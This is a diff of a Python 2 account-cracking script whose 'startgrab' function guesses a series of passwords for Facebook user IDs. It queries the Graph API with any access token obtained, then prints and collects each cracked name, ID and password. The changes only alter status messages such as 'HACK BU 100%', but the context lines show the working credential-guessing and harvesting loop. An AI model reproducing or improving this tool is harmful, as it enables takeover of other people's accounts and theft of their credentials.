@@ -300,13 +300,13 @@ def startgrab():
             if 'access_token' in q:
                 x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                 z = json.loads(x.text)
-                print '\x1b[37;1m HACK BU '
+                print '\x1b[37;1m HACK BU 100%'
                 print '\x1b[37;1mNAWE >>> ' + b['name']
                 print '\x1b[37;1mID kay >>>' + user
                 print '\x1b[37;1mPASSWORD kay >>>' + pass1 + '\n'
                 oks.append(user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[37;1maccount ka la Checkpoint ya'
+                print '\x1b[37;1mHack bw'
                 print '\x1b[37;1m NAWE >>> ' + b['name']
                 print '\x1b[37;1mID kay>>> ' + user
                 print '\x1b[37;1mPASSWORD kay>>> ' + pass1 + '\n'
@@ -321,13 +321,13 @@ def startgrab():
                 if 'access_token' in q:
                     x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                     z = json.loads(x.text)
-                    print '\x1b[37;1m HACK BU'
+                    print '\x1b[37;1m HACK BU 100%'
                     print '\x1b[37;1mNAWE >>> ' + b['name']
                     print '\x1b[37;1mID kay >>>' + user
                     print '\x1b[37;1mPASSWORD kay >>>' + pass2 + '\n'
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[37;1maccount ka la Checkpoint ya'
+                    print '\x1b[37;1mHACK BW'
                     print '\x1b[37;1m NAWE >>> ' + b['name']
                     print '\x1b[37;1mID kay>>> ' + user
                     print '\x1b[37;1mPASSWORD kay>>> ' + pass2 + '\n'
@@ -342,13 +342,13 @@ def startgrab():
                     if 'access_token' in q:
                         x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                         z = json.loads(x.text)
-                        print '\x1b[37;1m HACK BU'
+                        print '\x1b[37;1m HACK BU 100%'
                         print '\x1b[37;1mNAWE >>> ' + b['name']
                         print '\x1b[37;1mID kay >>>' + user
                         print '\x1b[37;1mPASSWORD kay >>>' + pass3 + '\n'
                         oks.append(user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[37;1maccount ka la Checkpoint ya'
+                        print '\x1b[37;1mHACK BW'
                         print '\x1b[37;1m NAWE >>> ' + b['name']
                         print '\x1b[37;1mID kay>>> ' + user
                         print '\x1b[37;1mPASSWORD kay>>> ' + pass3 + '\n'
@@ -363,13 +363,13 @@ def startgrab():
                         if 'access_token' in q:
                             x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                             z = json.loads(x.text)
-                            print '\x1b[37;1m HACK BU'
+                            print '\x1b[37;1m HACK BU 100%'
                             print '\x1b[37;1mNAWE >>> ' + b['name']
                             print '\x1b[37;1mID kay >>>' + user
                             print '\x1b[37;1mPASSWORD kay >>>' + pass4 + '\n'
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[37;1maccount ka la Checkpoint ya'
+                            print '\x1b[37;1mHACK BW '
                             print '\x1b[37;1m NAWE >>> ' + b['name']
                             print '\x1b[37;1mID kay>>> ' + user
                             print '\x1b[37;1mPASSWORD kay>>> ' + pass4 + '\n'
@@ -384,13 +384,13 @@ def startgrab():
                             if 'access_token' in q:
                                 x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                 z = json.loads(x.text)
-                                print '\x1b[37;1m HACK BU'
+                                print '\x1b[37;1m HACK BU 100%'
                                 print '\x1b[37;1mNAWE >>> ' + b['name']
                                 print '\x1b[37;1mID kay >>>' + user
                                 print '\x1b[37;1mPASSWORD kay >>>' + pass5 + '\n'
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[37;1maccount ka la Checkpoint ya'
+                                print '\x1b[37;1mHACK BW'
                                 print '\x1b[37;1m NAWE >>> ' + b['name']
                                 print '\x1b[37;1mID kay>>> ' + user
                                 print '\x1b[37;1mPASSWORD kay>>> ' + pass5 + '\n'
@@ -405,13 +405,13 @@ def startgrab():
                                 if 'access_token' in q:
                                     x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                     z = json.loads(x.text)
-                                    print '\x1b[37;1m HACK B'
+                                    print '\x1b[37;1m HACK BU 100%'
                                     print '\x1b[37;1mNAWE >>> ' + b['name']
                                     print '\x1b[37;1mID kay >>>' + user
                                     print '\x1b[37;1mPASSWORD kay >>>' + pass6 + '\n'
                                     oks.append(user + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[37;1maccount ka la Checkpoint ya'
+                                    print '\x1b[37;1mHACK BW'
                                     print '\x1b[37;1m NAWE >>> ' + b['name']
                                     print '\x1b[37;1mID kay>>> ' + user
                                     print '\x1b[37;1mPASSWORD kay>>> ' + pass6 + '\n'
@@ -426,13 +426,13 @@ def startgrab():
                                     if 'access_token' in q:
                                         x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                         z = json.loads(x.text)
-                                        print '\x1b[37;1m HACK BU'
+                                        print '\x1b[37;1m HACK BU 100%'
                                         print '\x1b[37;1mNAWE >>> ' + b['name']
                                         print '\x1b[37;1mID kay >>>' + user
                                         print '\x1b[37;1mPASSWORD kay >>>' + pass7 + '\n'
                                         oks.append(user + pass7)
                                     elif 'www.facebook.com' in q['error_msg']:
-                                        print '\x1b[37;1maccount ka la Checkpoint ya'
+                                        print '\x1b[37;1mHACK BW'
                                         print '\x1b[37;1m NAWE >>> ' + b['name']
                                         print '\x1b[37;1mID kay>>> ' + user
                                         print '\x1b[37;1mPASSWORD kay>>> ' + pass7 + '\n'
@@ -447,13 +447,13 @@ def startgrab():
                                         if 'access_token' in q:
                                             x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                             z = json.loads(x.text)
-                                            print '\x1b[37;1m HACK BU'
+                                            print '\x1b[37;1m HACK BU 100%'
                                             print '\x1b[37;1mNAWE >>> ' + b['name']
                                             print '\x1b[37;1mID kay >>>' + user
                                             print '\x1b[37;1mPASSWORD kay >>>' + pass8 + '\n'
                                             oks.append(user + pass8)
                                         elif 'www.facebook.com' in q['error_msg']:
-                                            print '\x1b[37;1maccount ka la Checkpoint ya'
+                                            print '\x1b[37;1mHACK BW '
                                             print '\x1b[37;1m NAWE >>> ' + b['name']
                                             print '\x1b[37;1mID kay>>> ' + user
                                             print '\x1b[37;1mPASSWORD kay>>> ' + pass8 + '\n'
@@ -468,7 +468,7 @@ def startgrab():
                                             if 'access_token' in q:
                                                 x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                 z = json.loads(x.text)
-                                                print '\x1b[37;1m HACK BU '
+                                                print '\x1b[37;1m HACK BU 100%'
                                                 print '\x1b[37;1mNAWE >>> ' + b['name']
                                                 print '\x1b[37;1mID kay >>>' + user
                                                 print '\x1b[37;1mPASSWORD kay >>>' + pass9 + '\n'
@@ -489,13 +489,13 @@ def startgrab():
                                                   if 'access_token' in q:
                                                     x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                     z = json.loads(x.text)
-                                                    print '\x1b[37;1m HACK BU '
+                                                    print '\x1b[37;1m HACK BU 100%'
                                                     print '\x1b[37;1mNAWE >>> ' + b['name']
                                                     print '\x1b[37;1mID kay >>>' + user
                                                     print '\x1b[37;1mPASSWORD kay >>>' + pass10 + '\n'
                                                     oks.append(user + pass10)
                                                   elif 'www.facebook.com' in q['error_msg']:
-                                                      print '\x1b[37;1maccount ka la Checkpoint ya'
+                                                      print '\x1b[37;1mHack bw'
                                                       print '\x1b[37;1m NAWE >>> ' + b['name']
                                                       print '\x1b[37;1mID kay>>> ' + user
                                                       print '\x1b[37;1mPASSWORD kay>>> ' + pass10 + '\n'
@@ -510,13 +510,13 @@ def startgrab():
                                                        if 'access_token' in q:
                                                           x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                           z = json.loads(x.text)
-                                                          print '\x1b[37;1m HACK BU '
+                                                          print '\x1b[37;1m HACK BU 100%'
                                                           print '\x1b[37;1mNAWE >>> ' + b['name']
                                                           print '\x1b[37;1mID kay >>>' + user
                                                           print '\x1b[37;1mPASSWORD kay >>>' + pass11 + '\n'
                                                           oks.append(user + pass11)
                                                        elif 'www.facebook.com' in q['error_msg']:
-                                                           print '\x1b[37;1maccount ka la Checkpoint ya'
+                                                           print '\x1b[37;1mHack Bw'
                                                            print '\x1b[37;1m NAWE >>> ' + b['name']
                                                            print '\x1b[37;1mID kay>>> ' + user
                                                            print '\x1b[37;1mPASSWORD kay>>> ' + pass11 + '\n'
@@ -531,13 +531,13 @@ def startgrab():
                                                            if 'access_token' in q:
                                                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                                z = json.loads(x.text)
-                                                               print '\x1b[37;1m HACK BU '
+                                                               print '\x1b[37;1m HACK BU 100%'
                                                                print '\x1b[37;1mNAWE >>> ' + b['name']
                                                                print '\x1b[37;1mID kay >>>' + user
                                                                print '\x1b[37;1mPASSWORD kay >>>' + pass12 + '\n'
                                                                oks.append(user + pass12)
                                                            elif 'www.facebook.com' in q['error_msg']:
-                                                               print '\x1b[37;1maccount ka la Checkpoint ya'
+                                                               print '\x1b[37;1mHACK BW '
                                                                print '\x1b[37;1m NAWE >>> ' + b['name']
                                                                print '\x1b[37;1mID kay>>> ' + user
                                                                print '\x1b[37;1mPASSWORD kay>>> ' + pass12 + '\n'
